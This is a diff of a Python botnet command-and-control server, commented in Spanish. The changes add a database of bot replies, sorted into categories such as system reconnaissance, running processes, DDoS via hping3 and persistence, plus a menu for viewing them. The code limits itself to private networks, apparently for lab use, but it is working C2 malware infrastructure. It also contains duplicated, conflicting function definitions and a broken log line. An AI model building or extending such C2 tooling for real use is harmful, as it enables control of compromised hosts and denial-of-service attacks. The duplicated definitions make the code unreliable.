@@ -1,5 +1,4 @@
 import logging
-from logging import config
 import socket
 import sys
 import threading
@@ -9,7 +8,7 @@ import ipaddress
 import requests
 import sqlite3
 import configparser
-from datetime import datetime, timezone, timedelta
+from datetime import datetime
 
 bots = [] # List de bots
 bot_ids = {} # Diccinario con los IDS de los bots
@@ -64,12 +63,34 @@ def configurar_logging(config):
         logging.error(f"Error al configurar el logging: {e}")
 
 # Inicializar la base de datos
+def actualizar_db_schema(DB_PATH):
+    """
+    Actualiza el esquema de la base de datos SQLite para agregar la columna 'categoria' a la tabla 'respuestas'.
+
+    :param DB_PATH: La ruta del archivo de la base de datos.
+    :type DB_PATH: str
+    """
+    try:
+        conn = sqlite3.connect(DB_PATH)
+        cursor = conn.cursor()
+
+        # Verificar si la columna 'categoria' ya existe
+        cursor.execute("PRAGMA table_info(respuestas)")
+        columns = [column[1] for column in cursor.fetchall()]
+        if 'categoria' not in columns:
+            cursor.execute("ALTER TABLE respuestas ADD COLUMN categoria TEXT DEFAULT 'general'")
+            conn.commit()
+            logging.info("Esquema de la base de datos actualizado correctamente.")
+        conn.close()
+    except Exception as e:
+        logging.error(f"Error al actualizar el esquema de la base de datos: {e}")
+
 def init_db(DB_PATH):
     """
-    Inicializa la base de datos SQLite para almacenar información sobre los bots.
+    Inicializa la base de datos SQLite para almacenar información sobre los bots y sus respuestas.
 
     Crea la carpeta y el archivo de la base de datos si no existe,
-    y crea la tabla "bots" si no existe.
+    y crea las tablas "bots" y "respuestas" si no existen.
 
     :param DB_PATH: La ruta del archivo de la base de datos.
     :type DB_PATH: str
@@ -91,11 +112,43 @@ def init_db(DB_PATH):
                             last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                         )''')
 
+        cursor.execute('''CREATE TABLE IF NOT EXISTS respuestas (
+                            id INTEGER PRIMARY KEY AUTOINCREMENT,
+                            bot_id INTEGER,
+                            respuesta TEXT,
+                            categoria TEXT,
+                            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                            FOREIGN KEY (bot_id) REFERENCES bots (id)
+                        )''')
+
         conn.commit()
         conn.close()
         logging.info("Base de datos inicializada correctamente.")
     except Exception as e:
         logging.error(f"Error al inicializar la base de datos: {e}")
+
+def agregar_respuesta_en_db(config, bot_id, respuesta, categoria="general"):
+    """
+    Agrega una respuesta de un bot a la base de datos SQLite.
+
+    :param config: Un objeto con la configuración del servidor.
+    :param bot_id: El ID del bot que envió la respuesta.
+    :type bot_id: int
+    :param respuesta: La respuesta del bot.
+    :type respuesta: str
+    :param categoria: La categoría de la respuesta.
+    :type categoria: str
+    """
+    try:
+        logging.debug(f"Agregando respuesta en DB: bot_id={bot_id}, respuesta={respuesta}, categoria={categoria}")
+        conn = sqlite3.connect(config["DB_PATH"], detect_types=sqlite3.PARSE_DECLTYPES | sqlite3.PARSE_COLNAMES)
+        cursor = conn.cursor()
+        cursor.execute("INSERT INTO respuestas (bot_id, respuesta, categoria, timestamp) VALUES (?, ?, ?, ?)", (bot_id, respuesta, categoria, datetime.now()))
+        conn.commit()
+        conn.close()
+        logging.info(f"Respuesta del bot {bot_id} agregada a la base de datos.")
+    except sqlite3.Error as e:
+        logging.error(f"Error al agregar la respuesta del bot en la base de datos: {e}")
 
 def detectarEntornoCloud():
     
@@ -214,10 +267,10 @@ def verificar_eula(tipo):
         exit()
 
 def adapt_datetime(dt):
-    return dt.strftime("%d-%m-%Y %H:%M:%S")
+    return dt.strftime("%Y-%m-%d %H:%M:%S")
 
 def convert_datetime(s):
-    return datetime.strptime(s.decode(), "%d-%m-%Y %H:%M:%S")
+    return datetime.strptime(s.decode(), "%Y-%m-%d %H:%M:%S")
 
 sqlite3.register_adapter(datetime, adapt_datetime)
 sqlite3.register_converter("timestamp", convert_datetime)
@@ -246,7 +299,7 @@ def agregar_o_actualizar_bot_en_db(config, identificador, ip, hostname, os):
             logging.info(f"Bot actualizado en la base de datos: {identificador}, {ip}, {hostname}, {os}")
         else:
             cursor.execute("INSERT INTO bots (identificador, ip, hostname, os, last_seen) VALUES (?, ?, ?, ?, ?)", (identificador, ip, hostname, os, datetime.now()))
-            logging.info(f"Bot agregado a la base de datos: {identificador}, {ip}, {hostname}, {os}")
+            logging.info(f"Bot agregado a la base de datos: {identificador}, {ip}, {hostname}, os")
         conn.commit()
         conn.close()
     except Exception as e:
@@ -269,6 +322,79 @@ def actualizar_bot_en_db(config, ip):
         logging.info(f"Bot actualizado en la base de datos: {ip}")
     except Exception as e:
         logging.error(f"Error al actualizar el bot en la base de datos: {e}")
+
+def obtener_categorias_disponibles(config, bot_id):
+    """
+    Obtiene las categorías disponibles de respuestas para un bot específico.
+
+    :param config: Un objeto con la configuración del servidor.
+    :param bot_id: El ID del bot cuyas categorías se desean obtener.
+    :type bot_id: int
+    :return: Una lista de categorías disponibles.
+    :rtype: list
+    """
+    try:
+        conn = sqlite3.connect(config["DB_PATH"], detect_types=sqlite3.PARSE_DECLTYPES | sqlite3.PARSE_COLNAMES)
+        cursor = conn.cursor()
+        cursor.execute("SELECT DISTINCT categoria FROM respuestas WHERE bot_id = ?", (bot_id,))
+        categorias = [row[0] for row in cursor.fetchall()]
+        conn.close()
+        return categorias
+    except Exception as e:
+        logging.error(f"Error al obtener las categorías del bot {bot_id}: {e}")
+        return []
+
+def obtener_respuestas_bot(config, bot_id, categoria=None):
+    """
+    Obtiene las respuestas de un bot específico desde la base de datos SQLite.
+
+    :param config: Un objeto con la configuración del servidor.
+    :param bot_id: El ID del bot cuyas respuestas se desean obtener.
+    :type bot_id: int
+    :param categoria: La categoría de respuesta a filtrar (opcional).
+    :type categoria: str
+    :return: Una lista de respuestas del bot.
+    :rtype: list
+    """
+    try:
+        conn = sqlite3.connect(config["DB_PATH"], detect_types=sqlite3.PARSE_DECLTYPES | sqlite3.PARSE_COLNAMES)
+        cursor = conn.cursor()
+        if categoria:
+            cursor.execute("SELECT respuesta, timestamp FROM respuestas WHERE bot_id = ? AND categoria = ?", (bot_id, categoria))
+        else:
+            cursor.execute("SELECT respuesta, timestamp FROM respuestas WHERE bot_id = ?", (bot_id,))
+        respuestas = cursor.fetchall()
+        conn.close()
+        return respuestas
+    except Exception as e:
+        logging.error(f"Error al obtener las respuestas del bot {bot_id}: {e}")
+        return []
+
+def ver_respuestas_bot(config):
+    """
+    Muestra las respuestas de un bot específico y permite filtrar por categoría.
+
+    :param config: Un objeto con la configuración del servidor.
+    """
+    try:
+        listar_bots()
+        bot_id = int(input("Ingrese el ID del bot cuyas respuestas desea ver: "))
+        categorias = obtener_categorias_disponibles(config, bot_id)
+        if categorias:
+            print(f"Categorías disponibles: {', '.join(categorias)}")
+        categoria = input("Ingrese la categoría de respuesta a filtrar (opcional): ").strip()
+
+        respuestas = obtener_respuestas_bot(config, bot_id, categoria if categoria in categorias else None)
+        if respuestas:
+            print(f"\nRespuestas del bot {bot_id}:")
+            for respuesta, timestamp in respuestas:
+                print(f"[{timestamp}] {respuesta}")
+        else:
+            print(f"No se encontraron respuestas para el bot {bot_id} con la categoría '{categoria}'.")
+    except ValueError:
+        print("ID inválido. Debe ingresar un número.")
+    except Exception as e:
+        logging.error(f"Error al ver las respuestas del bot: {e}")
 
 def manejar_bot(conn, addr, bot_id, config):
     """
@@ -313,7 +439,26 @@ def manejar_bot(conn, addr, bot_id, config):
 
                 # Guardar la respuesta en el diccionario sin imprimirla
                 respuestas_bots[bot_id] = data
+                logging.debug(f"Respuesta recibida de bot {bot_id}: {data}")
                 actualizar_bot_en_db(config, ip)
+                categoria = "general"
+                if "systeminfo" in data or "uname" in data:
+                    categoria = "informacion_sistema"
+                elif "netstat" in data:
+                    categoria = "conexiones_red"
+                elif "tasklist" in data or "ps aux" in data:
+                    categoria = "procesos"
+                elif "dir" in data or "ls -lah" in data:
+                    categoria = "archivos"
+                elif "curl ifconfig.me" in data:
+                    categoria = "ip_publica"
+                elif "hping3" in data or "Test-NetConnection" in data:
+                    categoria = "ddos"
+                elif "persistencia" in data:
+                    categoria = "persistencia"
+                else:
+                    categoria = "comando_personalizado"
+                agregar_respuesta_en_db(config, bot_id, data, categoria)
 
             except socket.timeout:
                 print(f"Tiempo de espera agotado con {addr}.")
@@ -331,62 +476,6 @@ def manejar_bot(conn, addr, bot_id, config):
         conn.close()
         logging.info(f"Bot {bot_id} desconectado")
         print(f"Bot {bot_id} desconectado")
-
-def servidor_CnC(HOST, PORT, config):
-    global server_running
-    """
-    Inicia el servidor de Comando y Control (CnC). Crea un socket, lo asocia
-    a la IP y el puerto especificados y lo pone en escucha. Luego, crea un hilo
-    para aceptar conexiones y entra en un bucle para mostrar un menú principal
-    que permite al usuario interactuar con los bots conectados.
-
-    :param HOST: La dirección IP del servidor.
-    :type HOST: str
-    :param PORT: El puerto de escucha del servidor.
-    :type PORT: int
-    :param config: Un objeto con la configuración del servidor.
-    :return: None
-    """
-    try:
-        logging.info(f"Iniciando servidor CnC en {HOST}:{PORT}")
-        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Crear el socket
-        server.bind((HOST, PORT)) # Asociar el socket a la IP y el puerto
-        server.listen(5) # Escuchar conexiones
-        print(f"Escuchando en {HOST}:{PORT}...") # Imprimir que el servidor esta escuchando
-        
-        threading.Thread(target=aceptar_conexiones, args=(server, config)).start() # Crear un hilo para aceptar conexiones
-
-        while server_running:
-            print("\nMenú Principal:")
-            print("1. Listar bots conectados")
-            print("2. Enviar comandos")
-            print("3. Cerrar conexión con un bot")
-            print("4. Salir")
-            opcion = input("Seleccione una opción: ")
-
-            if opcion == "1":
-                listar_bots(config)
-            elif opcion == "2":
-                menu_comandos()
-            elif opcion == "3":
-                cerrar_conexion_bots(config)
-            elif opcion == "4":
-                logging.info("Servidor CnC detenido")
-                print("Saliendo de la consola...")
-                server_running = False
-                server.close()
-                break
-            else:
-                print("Opción no válida. Intente de nuevo.")
-        
-        # Esperar a que todos los hilos de bots terminen
-        for bot in bots:
-            bot.close()
-        for thread in threading.enumerate():
-            if thread is not threading.current_thread():
-                thread.join()
-    except Exception as e:
-        logging.error(f"Error en el servidor CnC: {e}")
 
 def aceptar_conexiones(server, config):
     global server_running
@@ -421,28 +510,132 @@ def aceptar_conexiones(server, config):
     except Exception as e:
         logging.error(f"Error al aceptar conexiones: {e}")
 
-def listar_bots(config):
+def obtener_respuestas_bot(config, bot_id, tipo=None):
     """
-    Muestra la lista de bots conectados al servidor C&C desde la base de datos,
-    incluyendo su identificador, sistema operativo y dirección IP y puerto de
-    conexión.
-    
+    Obtiene las respuestas de un bot específico desde la base de datos SQLite.
+
+    :param config: Un objeto con la configuración del servidor.
+    :param bot_id: El ID del bot cuyas respuestas se desean obtener.
+    :type bot_id: int
+    :param tipo: El tipo de respuesta a filtrar (opcional).
+    :type tipo: str
+    :return: Una lista de respuestas del bot.
+    :rtype: list
+    """
+    try:
+        conn = sqlite3.connect(config["DB_PATH"], detect_types=sqlite3.PARSE_DECLTYPES | sqlite3.PARSE_COLNAMES)
+        cursor = conn.cursor()
+        if tipo:
+            cursor.execute("SELECT respuesta, timestamp FROM respuestas WHERE bot_id = ? AND respuesta LIKE ?", (bot_id, f"%{tipo}%"))
+        else:
+            cursor.execute("SELECT respuesta, timestamp FROM respuestas WHERE bot_id = ?", (bot_id,))
+        respuestas = cursor.fetchall()
+        conn.close()
+        return respuestas
+    except Exception as e:
+        logging.error(f"Error al obtener las respuestas del bot {bot_id}: {e}")
+        return []
+
+def ver_respuestas_bot(config):
+    """
+    Muestra las respuestas de un bot específico y permite filtrar por categoría.
+
+    :param config: Un objeto con la configuración del servidor.
+    """
+    try:
+        listar_bots()
+        bot_id = int(input("Ingrese el ID del bot cuyas respuestas desea ver: "))
+        categorias = obtener_categorias_disponibles(config, bot_id)
+        if categorias:
+            print(f"Categorías disponibles: {', '.join(categorias)}")
+        categoria = input("Ingrese la categoría de respuesta a filtrar (opcional): ").strip()
+
+        respuestas = obtener_respuestas_bot(config, bot_id, categoria if categoria in categorias else None)
+        if respuestas:
+            print(f"\nRespuestas del bot {bot_id}:")
+            for respuesta, timestamp in respuestas:
+                print(f"[{timestamp}] {respuesta}")
+        else:
+            print(f"No se encontraron respuestas para el bot {bot_id} con la categoría '{categoria}'.")
+    except ValueError:
+        print("ID inválido. Debe ingresar un número.")
+    except Exception as e:
+        logging.error(f"Error al ver las respuestas del bot: {e}")
+
+def servidor_CnC(HOST, PORT, config):
+    global server_running
+    """
+    Inicia el servidor de Comando y Control (CnC). Crea un socket, lo asocia
+    a la IP y el puerto especificados y lo pone en escucha. Luego, crea un hilo
+    para aceptar conexiones y entra en un bucle para mostrar un menú principal
+    que permite al usuario interactuar con los bots conectados.
+
+    :param HOST: La dirección IP del servidor.
+    :type HOST: str
+    :param PORT: El puerto de escucha del servidor.
+    :type PORT: int
     :param config: Un objeto con la configuración del servidor.
     :return: None
     """
     try:
-        logging.info("Listando bots conectados")
-        conn = sqlite3.connect(config["DB_PATH"])
-        cursor = conn.cursor()
-        cursor.execute("SELECT id, ip, hostname, os, last_seen FROM bots")
-        bots = cursor.fetchall()
-        conn.close()
+        logging.info(f"Iniciando servidor CnC en {HOST}:{PORT}")
+        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Crear el socket
+        server.bind((HOST, PORT)) # Asociar el socket a la IP y el puerto
+        server.listen(5) # Escuchar conexiones
+        print(f"Escuchando en {HOST}:{PORT}...") # Imprimir que el servidor esta escuchando
+        
+        threading.Thread(target=aceptar_conexiones, args=(server, config)).start() # Crear un hilo para aceptar conexiones
 
+        while server_running:
+            print("\nMenú Principal:")
+            print("1. Listar bots conectados")
+            print("2. Enviar comandos")
+            print("3. Cerrar conexión con un bot")
+            print("4. Ver respuestas de un bot")
+            print("5. Salir")
+            opcion = input("Seleccione una opción: ")
+
+            if opcion == "1":
+                listar_bots()
+            elif opcion == "2":
+                menu_comandos()
+            elif opcion == "3":
+                cerrar_conexion_bots()
+            elif opcion == "4":
+                ver_respuestas_bot(config)
+            elif opcion == "5":
+                logging.info("Servidor CnC detenido")
+                print("Saliendo de la consola...")
+                server_running = False
+                server.close()
+                break
+            else:
+                print("Opción no válida. Intente de nuevo.")
+        
+        # Esperar a que todos los hilos de bots terminen
+        for bot in bots:
+            bot.close()
+        for thread in threading.enumerate():
+            if thread is not threading.current_thread():
+                thread.join()
+    except Exception as e:
+        logging.error(f"Error en el servidor CnC: {e}")
+
+def listar_bots():
+    """
+    Muestra la lista de bots conectados al servidor C&C, incluyendo
+    su identificador, sistema operativo y dirección IP y puerto de
+    conexión.
+    
+    :return: None
+    """
+    try:
+        logging.info("Listando bots conectados")
         if bots:
             print("\nBots conectados:")
-            for bot in bots:
-                bot_id, ip, hostname, os, last_seen = bot
-                print(f"Bot {bot_id} ({os.capitalize()}): {ip} ({hostname}), Última vez visto: {last_seen}")
+            for bot in bots: # Recorrer la lista de bots
+                so = sistemas_operativos.get(bot, "Desconocido") # Obtener el SO del bot
+                print(f"Bot {bot_ids[bot]} ({so.capitalize()}): {bot.getpeername()}") # Imprimir el bot
         else:
             print("No hay bots conectados.")
     except Exception as e:
@@ -739,23 +932,24 @@ def enviar_comando_a_bot(bot, comando_windows, comando_linux, tipo_comando=None)
     except Exception as e:
         logging.error(f"Error al enviar comando al bot {bot_ids.get(bot, 'Desconocido')}: {e}")
 
-def cerrar_conexion_bots(config):
+def cerrar_conexion_bots():
+    
     """
-    Cierra la conexión con un bot seleccionado por el usuario y lo elimina de la base de datos.
+    Cierra la conexión con un bot seleccionado por el usuario.
     
     El usuario puede seleccionar a los bots a los que quiere cerrar la conexión
     mediante un ID o bien escribir "todos" para cerrar la conexión con todos
     los bots conectados.
     
-    :param config: Un objeto con la configuración del servidor.
     :return: None
     """
     try:
         logging.info("Cerrando conexión con los bots seleccionados")
-        conn = sqlite3.connect(config["DB_PATH"])
-        cursor = conn.cursor()
+        if not bots:
+            print("No hay bots conectados.")
+            return
 
-        listar_bots(config)
+        listar_bots()
         
         try:
             bot_id = int(input("Seleccione el ID del bot cuya conexión quiere cerrar: ")) # Obtener el ID del bot seleccionado
@@ -763,9 +957,26 @@ def cerrar_conexion_bots(config):
             print("ID inválido. Debe ingresar un número.")
             return
 
-        cursor.execute("DELETE FROM bots WHERE id = ?", (bot_id,))
-        conn.commit()
-        conn.close()
+        bot = next((b for b in bots if bot_ids.get(b) == bot_id), None) # Buscar el bot con el ID correspondiente
+        
+        if not bot: # Si no se encuentra el bot
+            print(f"ID de bot {bot_id} no válido.") # Imprimir un mensaje de error
+            return
+
+        try:
+            bot.close() # Cerrar la conexión
+            print(f"Conexión con el bot {bot_id} cerrada.") # Imprimir un mensaje de confirmación
+        except Exception as e:
+            print(f"Error al cerrar la conexión con el bot {bot_id}: {e}")
+
+        if bot in bots:
+            bots.remove(bot) # Eliminar el bot de la lista
+
+        if bot in bot_ids:
+            del bot_ids[bot] # Eliminar el ID del bot
+
+        if bot in sistemas_operativos:
+            del sistemas_operativos[bot] # Eliminar el SO del bot
 
         print(f"Bot {bot_id} eliminado correctamente del sistema.")
     except Exception as e:
@@ -811,7 +1022,7 @@ def cargar_configuracion():
             "HOST": config.get("NETWORK", "HOST"),
             "PORT": config.getint("NETWORK", "PORT"),
             "MAX_CONNECTIONS": config.getint("NETWORK", "MAX_CONNECTIONS"),
-            "DB_PATH": os.path.join(BASE_DIR, "..", config.get("DATABASE", "DB_PATH")),
+            "DB_PATH": os.path.join(BASE_DIR, config.get("DATABASE", "DB_PATH")),
             "SECRET_KEY": config.get("SECURITY", "SECRET_KEY"),
             "HASH_ALGORITHM": config.get("SECURITY", "HASH_ALGORITHM"),
             "LOG_LEVEL": config.get("LOGGING", "LOG_LEVEL"),
@@ -832,9 +1043,9 @@ def iniciar_servidor():
     :return: None
     """
     try:
+        logging.info("Iniciando servidor de Comando y Control (C2)")
         config = cargar_configuracion()
         configurar_logging(config)  # Pasar el objeto de configuración en lugar de la cadena
-        logging.info("Iniciando servidor de Comando y Control (C2)")
         if not esRedPrivada(config["HOST"]):
             input("[ERROR] No puedes ejecutar este servidor fuera de una red privada. Presione ENTER para cerrar.")
             sys.exit(1)
